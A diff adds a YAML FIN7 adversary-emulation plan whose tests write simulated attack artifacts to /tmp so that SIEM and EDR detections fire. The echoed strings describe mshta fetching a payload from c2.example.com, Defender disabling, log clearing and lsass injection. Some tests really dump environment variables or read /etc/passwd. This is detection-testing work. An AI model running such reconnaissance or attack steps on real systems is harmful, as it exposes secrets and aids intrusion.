@@ -1,0 +1,452 @@
+name: FIN7 Emulation Plan
+id: ep-fin7-v1
+version: "1.0"
+author: Sam Jackson
+date: 2025-11-20
+description: >
+  ATT&CK-aligned emulation of FIN7 TTPs targeting financial sector
+  organizations. All tests are safe/harmless and designed to trigger
+  SIEM and EDR detections. FIN7 (also known as Carbanak, Navigator) is
+  a financially motivated threat group known for targeting retail,
+  hospitality, and financial organizations.
+mitre_groups:
+  - G0046
+references:
+  - https://attack.mitre.org/groups/G0046/
+  - https://www.mandiant.com/resources/fin7-group-targets-personnel-involved-sec-filings
+  - https://www.crowdstrike.com/blog/carbon-spider-graphic-designer/
+tags:
+  - financially-motivated
+  - fin7
+  - carbanak
+  - retail
+  - hospitality
+  - financial-sector
+
+phases:
+  - id: phase-1
+    name: Initial Access
+    description: >
+      FIN7 is known for highly targeted spearphishing campaigns using
+      malicious Microsoft Office documents with embedded macros and
+      carefully crafted social engineering lures targeting employees
+      involved in financial processes.
+    techniques:
+      - id: T1566.001
+        name: Spearphishing Attachment
+        tactic: initial-access
+        test_id: FIN7-AT-001
+        test_name: Create financial lure document artifact
+        description: >
+          Creates a file artifact simulating a financial lure document
+          as used by FIN7 in spearphishing campaigns targeting financial
+          staff. The file name follows FIN7 naming patterns.
+        command: "echo 'PHISH_SIM: attachment=Q4_2025_Financial_Report_CONFIDENTIAL.doc macro_enabled=true' > /tmp/financial_lure_artifact.txt"
+        expected_detection: Office document with macro execution in financial context
+        detection_rule: sigma/fin7-financial-lure-doc.yml
+        safe: true
+        cleanup: "rm -f /tmp/financial_lure_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1566/001/
+
+      - id: T1204.002
+        name: Malicious File
+        tactic: initial-access
+        test_id: FIN7-AT-002
+        test_name: Simulate user execution of malicious file
+        description: >
+          Creates an artifact representing a user executing a malicious
+          file disguised as a financial document.
+        command: "echo 'USER_EXEC_SIM: file=invoice_march2026.xls user_action=macro_enabled parent=excel.exe child=cmd.exe' > /tmp/malicious_file_exec_artifact.txt"
+        expected_detection: Office application spawning command interpreter as child process
+        detection_rule: sigma/office-child-process-spawned.yml
+        safe: true
+        cleanup: "rm -f /tmp/malicious_file_exec_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1204/002/
+
+      - id: T1189
+        name: Drive-by Compromise
+        tactic: initial-access
+        test_id: FIN7-AT-003
+        test_name: Create drive-by download artifact
+        description: >
+          Creates an artifact simulating a drive-by download event
+          where a browser visits a compromised website that delivers
+          a payload to the victim.
+        command: "echo 'DRIVEBY_SIM: src_url=http://compromised-news.example.com/update browser=chrome.exe downloaded=flash_update.exe' > /tmp/driveby_artifact.txt"
+        expected_detection: Browser downloading executable from non-CDN URL
+        detection_rule: sigma/browser-executable-download.yml
+        safe: true
+        cleanup: "rm -f /tmp/driveby_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1189/
+
+  - id: phase-2
+    name: Execution
+    description: >
+      FIN7 relies heavily on living-off-the-land techniques, using
+      PowerShell, WScript/CScript, MSHTA, and other built-in Windows
+      tools to execute payloads without dropping traditional malware.
+    techniques:
+      - id: T1059.001
+        name: PowerShell
+        tactic: execution
+        test_id: FIN7-AT-004
+        test_name: Simulate encoded PowerShell execution artifact
+        description: >
+          Creates an artifact simulating encoded PowerShell execution
+          as heavily used by FIN7 for payload execution.
+        command: "echo 'PS_EXEC_SIM: powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA cmdline_len=1024' > /tmp/powershell_exec_artifact.txt"
+        expected_detection: PowerShell with encoded command parameter exceeding length threshold
+        detection_rule: sigma/powershell-encoded-command.yml
+        safe: true
+        cleanup: "rm -f /tmp/powershell_exec_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1059/001/
+
+      - id: T1059.005
+        name: Visual Basic
+        tactic: execution
+        test_id: FIN7-AT-005
+        test_name: Simulate VBScript execution artifact
+        description: >
+          Creates an artifact representing VBScript execution via
+          WScript or CScript as used in FIN7 campaigns.
+        command: "echo 'VBS_EXEC_SIM: wscript.exe script=C:\\Users\\Public\\update.vbs args=/B /NoLogo' > /tmp/vbscript_exec_artifact.txt"
+        expected_detection: WScript or CScript executing file from user-writable location
+        detection_rule: sigma/wscript-user-dir-execution.yml
+        safe: true
+        cleanup: "rm -f /tmp/vbscript_exec_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1059/005/
+
+      - id: T1218.005
+        name: Mshta
+        tactic: execution
+        test_id: FIN7-AT-006
+        test_name: Simulate MSHTA execution for proxy execution
+        description: >
+          Creates an artifact simulating use of mshta.exe to execute
+          HTA payloads, a common FIN7 technique for proxy execution.
+        command: "echo 'MSHTA_SIM: mshta.exe http://c2.example.com/payload.hta parent=winword.exe' > /tmp/mshta_exec_artifact.txt"
+        expected_detection: MSHTA executing remote HTA content from Office application parent
+        detection_rule: sigma/mshta-remote-url-execution.yml
+        safe: true
+        cleanup: "rm -f /tmp/mshta_exec_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1218/005/
+
+      - id: T1059.004
+        name: Unix Shell
+        tactic: execution
+        test_id: FIN7-AT-007
+        test_name: Read environment variables for system context
+        description: >
+          Reads environment variables to simulate attacker reconnaissance
+          of the execution environment. Safe read-only operation.
+        command: "printenv > /tmp/env_exec_artifact.txt 2>/dev/null | head -20"
+        expected_detection: Enumeration of all environment variables by suspicious process
+        detection_rule: sigma/full-env-enumeration.yml
+        safe: true
+        cleanup: "rm -f /tmp/env_exec_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1059/004/
+
+  - id: phase-3
+    name: Persistence
+    description: >
+      FIN7 uses multiple persistence mechanisms to maintain long-term
+      access to financial systems and point-of-sale environments.
+    techniques:
+      - id: T1053.005
+        name: Scheduled Task
+        tactic: persistence
+        test_id: FIN7-AT-008
+        test_name: Create simulated scheduled task artifact
+        description: >
+          Creates an artifact representing a malicious scheduled task
+          as used by FIN7 for persistence.
+        command: "echo 'SCHTASK_SIM: taskname=WindowsUpdateCheck action=powershell.exe -enc BASE64PAYLOAD trigger=ONLOGON user=SYSTEM' > /tmp/scheduled_task_artifact.txt"
+        expected_detection: New scheduled task created running encoded PowerShell at logon
+        detection_rule: sigma/malicious-scheduled-task.yml
+        safe: true
+        cleanup: "rm -f /tmp/scheduled_task_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1053/005/
+
+      - id: T1547.001
+        name: Registry Run Keys / Startup Folder
+        tactic: persistence
+        test_id: FIN7-AT-009
+        test_name: Simulate registry run key persistence artifact
+        description: >
+          Creates an artifact representing a registry run key modification
+          used by FIN7 for persistence between reboots.
+        command: "echo 'REG_RUN_SIM: key=HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run value=WindowsHelper data=C:\\Users\\Public\\svchost32.exe' > /tmp/registry_run_artifact.txt"
+        expected_detection: Registry run key modification with executable in non-standard path
+        detection_rule: sigma/registry-run-key-modification.yml
+        safe: true
+        cleanup: "rm -f /tmp/registry_run_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1547/001/
+
+      - id: T1543.003
+        name: Windows Service
+        tactic: persistence
+        test_id: FIN7-AT-010
+        test_name: Simulate malicious service installation artifact
+        description: >
+          Creates an artifact representing installation of a malicious
+          Windows service for persistence, as used by FIN7.
+        command: "echo 'SVC_INSTALL_SIM: name=WinAudioHelper binpath=C:\\Windows\\Temp\\audio_helper.exe start=auto description=Windows Audio Helper Service' > /tmp/service_install_artifact.txt"
+        expected_detection: New service created with binary in non-standard system directory
+        detection_rule: sigma/service-installed-non-standard-path.yml
+        safe: true
+        cleanup: "rm -f /tmp/service_install_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1543/003/
+
+      - id: T1546.003
+        name: Windows Management Instrumentation Event Subscription
+        tactic: persistence
+        test_id: FIN7-AT-011
+        test_name: Simulate WMI event subscription persistence artifact
+        description: >
+          Creates an artifact simulating a WMI event subscription used
+          for fileless persistence as observed in FIN7 operations.
+        command: "echo 'WMI_PERSIST_SIM: filter=ProcessStarted consumer=ActiveScriptEventConsumer script=VBScript query=SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA Win32_Process' > /tmp/wmi_persist_artifact.txt"
+        expected_detection: WMI event subscription with script consumer created
+        detection_rule: sigma/wmi-persist-event-subscription.yml
+        safe: true
+        cleanup: "rm -f /tmp/wmi_persist_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1546/003/
+
+  - id: phase-4
+    name: Privilege Escalation
+    description: >
+      FIN7 uses various methods to escalate privileges and gain
+      SYSTEM-level access to target financial systems.
+    techniques:
+      - id: T1055.001
+        name: Dynamic-link Library Injection
+        tactic: privilege-escalation
+        test_id: FIN7-AT-012
+        test_name: Simulate DLL injection artifact
+        description: >
+          Creates an artifact representing a DLL injection event as
+          used by FIN7 to escalate privileges in target processes.
+        command: "echo 'DLL_INJECT_SIM: src_proc=notepad.exe target_proc=lsass.exe dll_path=C:\\Windows\\Temp\\payload.dll technique=LoadLibrary' > /tmp/dll_inject_artifact.txt"
+        expected_detection: Cross-process DLL load from non-standard path detected
+        detection_rule: sigma/dll-injection-cross-process.yml
+        safe: true
+        cleanup: "rm -f /tmp/dll_inject_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1055/001/
+
+      - id: T1068
+        name: Exploitation for Privilege Escalation
+        tactic: privilege-escalation
+        test_id: FIN7-AT-013
+        test_name: Create local privilege escalation artifact
+        description: >
+          Creates an artifact simulating a local privilege escalation
+          exploit being used to gain SYSTEM privileges.
+        command: "echo 'LPE_SIM: exploit=CVE-2021-34527 initial_user=lowpriv escalated_to=SYSTEM target_process=spoolsv.exe' > /tmp/lpe_artifact.txt"
+        expected_detection: Privilege escalation via known CVE pattern in process context
+        detection_rule: sigma/local-privesc-exploit-pattern.yml
+        safe: true
+        cleanup: "rm -f /tmp/lpe_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1068/
+
+      - id: T1078.002
+        name: Domain Accounts
+        tactic: privilege-escalation
+        test_id: FIN7-AT-014
+        test_name: Simulate domain account abuse artifact
+        description: >
+          Creates an artifact simulating the use of compromised domain
+          credentials for privilege escalation.
+        command: "echo 'DOMAIN_ACCT_SIM: user=svc-sql-prod domain=corp.internal new_permissions=sysadmin database=financial_db' > /tmp/domain_account_artifact.txt"
+        expected_detection: Domain service account granted elevated database permissions outside change process
+        detection_rule: sigma/domain-account-privilege-change.yml
+        safe: true
+        cleanup: "rm -f /tmp/domain_account_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1078/002/
+
+      - id: T1134.001
+        name: Token Impersonation/Theft
+        tactic: privilege-escalation
+        test_id: FIN7-AT-015
+        test_name: Simulate token impersonation artifact
+        description: >
+          Creates an artifact simulating token impersonation as used
+          by FIN7 tools like Carbanak for privilege escalation.
+        command: "echo 'TOKEN_IMPERSONATE_SIM: impersonator=cmd.exe victim_token_owner=SYSTEM impersonation_level=SecurityImpersonation' > /tmp/token_impersonate_artifact.txt"
+        expected_detection: Process impersonating SYSTEM token from user-level process
+        detection_rule: sigma/token-impersonation-system.yml
+        safe: true
+        cleanup: "rm -f /tmp/token_impersonate_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1134/001/
+
+  - id: phase-5
+    name: Defense Evasion
+    description: >
+      FIN7 employs sophisticated defense evasion techniques to avoid
+      detection by antivirus, EDR, and security monitoring tools.
+    techniques:
+      - id: T1140
+        name: Deobfuscate/Decode Files or Information
+        tactic: defense-evasion
+        test_id: FIN7-AT-016
+        test_name: Decode simulated obfuscated payload artifact
+        description: >
+          Decodes a base64-encoded string to simulate payload
+          deobfuscation as used by FIN7 tools.
+        command: "echo 'aGVsbG8gd29ybGQ=' | base64 -d > /tmp/deobfuscated_payload_artifact.txt"
+        expected_detection: Base64 decoding operation producing executable or script content
+        detection_rule: sigma/payload-deobfuscation-detected.yml
+        safe: true
+        cleanup: "rm -f /tmp/deobfuscated_payload_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1140/
+
+      - id: T1112
+        name: Modify Registry
+        tactic: defense-evasion
+        test_id: FIN7-AT-017
+        test_name: Simulate registry modification for AV bypass
+        description: >
+          Creates an artifact simulating a registry modification to
+          disable security features as part of defense evasion.
+        command: "echo 'REG_MOD_SIM: key=HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender value=DisableAntiSpyware data=1 user=SYSTEM' > /tmp/registry_mod_artifact.txt"
+        expected_detection: Windows Defender policy registry key disabled
+        detection_rule: sigma/defender-disabled-via-registry.yml
+        safe: true
+        cleanup: "rm -f /tmp/registry_mod_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1112/
+
+      - id: T1070.001
+        name: Clear Windows Event Logs
+        tactic: defense-evasion
+        test_id: FIN7-AT-018
+        test_name: Simulate event log clearing artifact
+        description: >
+          Creates an artifact simulating the clearing of Windows event
+          logs to remove evidence of malicious activity.
+        command: "echo 'LOG_CLEAR_SIM: channel=Security record_count_before=15423 record_count_after=0 cleared_by=SYSTEM timestamp=2026-01-15T15:00:00Z' > /tmp/eventlog_clear_artifact.txt"
+        expected_detection: Security event log cleared (Event ID 1102 equivalent)
+        detection_rule: sigma/security-eventlog-cleared.yml
+        safe: true
+        cleanup: "rm -f /tmp/eventlog_clear_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1070/001/
+
+      - id: T1562.004
+        name: Disable or Modify System Firewall
+        tactic: defense-evasion
+        test_id: FIN7-AT-019
+        test_name: Simulate firewall rule modification artifact
+        description: >
+          Creates an artifact simulating a firewall rule modification
+          to allow C2 traffic as part of FIN7 defense evasion.
+        command: "echo 'FW_MOD_SIM: action=add_rule name=WindowsHelper direction=outbound protocol=TCP port=443 program=C:\\Windows\\Temp\\helper.exe' > /tmp/firewall_mod_artifact.txt"
+        expected_detection: Firewall rule added for executable in non-standard path
+        detection_rule: sigma/firewall-rule-added-for-unusual-program.yml
+        safe: true
+        cleanup: "rm -f /tmp/firewall_mod_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1562/004/
+
+      - id: T1027.001
+        name: Binary Padding
+        tactic: defense-evasion
+        test_id: FIN7-AT-020
+        test_name: Create padded binary artifact
+        description: >
+          Creates a file artifact simulating a padded binary used to
+          evade hash-based detection as employed by FIN7.
+        command: "dd if=/dev/zero bs=1024 count=10 2>/dev/null | cat - <(echo 'PADDING_SIM: binary_padding_for_hash_evasion') > /tmp/padded_binary_artifact.txt 2>/dev/null || echo 'PADDING_SIM: binary_padding_for_hash_evasion' > /tmp/padded_binary_artifact.txt"
+        expected_detection: Executable with high entropy null-byte padding detected
+        detection_rule: sigma/binary-padding-detected.yml
+        safe: true
+        cleanup: "rm -f /tmp/padded_binary_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1027/001/
+
+  - id: phase-6
+    name: Discovery
+    description: >
+      FIN7 performs extensive reconnaissance of target environments,
+      focusing on identifying POS systems, financial databases, and
+      payment card processing infrastructure.
+    techniques:
+      - id: T1057
+        name: Process Discovery
+        tactic: discovery
+        test_id: FIN7-AT-021
+        test_name: Enumerate running processes
+        description: >
+          Lists running processes to simulate FIN7 reconnaissance for
+          POS software and security tools. Safe read-only operation.
+        command: "ps aux > /tmp/process_discovery_artifact.txt 2>/dev/null | head -30"
+        expected_detection: Full process listing executed by non-admin process
+        detection_rule: sigma/process-discovery-enumeration.yml
+        safe: true
+        cleanup: "rm -f /tmp/process_discovery_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1057/
+
+      - id: T1049
+        name: System Network Connections Discovery
+        tactic: discovery
+        test_id: FIN7-AT-022
+        test_name: Read /etc/hosts for network enumeration
+        description: >
+          Reads /etc/hosts to enumerate network infrastructure as
+          part of FIN7 reconnaissance for lateral movement targets.
+        command: "cat /etc/hosts > /tmp/network_connections_artifact.txt"
+        expected_detection: Network connection enumeration by non-admin process
+        detection_rule: sigma/network-connection-discovery.yml
+        safe: true
+        cleanup: "rm -f /tmp/network_connections_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1049/
+
+      - id: T1087.001
+        name: Local Account
+        tactic: discovery
+        test_id: FIN7-AT-023
+        test_name: Read /etc/passwd for account enumeration
+        description: >
+          Reads /etc/passwd to enumerate local accounts. This file is
+          world-readable on Linux systems. Simulates attacker account
+          enumeration targeting service accounts.
+        command: "cat /etc/passwd > /tmp/account_discovery_artifact.txt"
+        expected_detection: /etc/passwd read by process outside normal system context
+        detection_rule: sigma/passwd-file-access.yml
+        safe: true
+        cleanup: "rm -f /tmp/account_discovery_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1087/001/
+
+      - id: T1082
+        name: System Information Discovery
+        tactic: discovery
+        test_id: FIN7-AT-024
+        test_name: Collect hostname and system information
+        description: >
+          Collects hostname and basic system information as FIN7
+          would do to profile target systems.
+        command: "echo \"hostname=$(hostname) kernel=$(uname -r) arch=$(uname -m)\" > /tmp/sysinfo_fin7_artifact.txt"
+        expected_detection: Multiple system enumeration commands in rapid succession
+        detection_rule: sigma/system-info-discovery-burst.yml
+        safe: true
+        cleanup: "rm -f /tmp/sysinfo_fin7_artifact.txt"
+        references:
+          - https://attack.mitre.org/techniques/T1082/
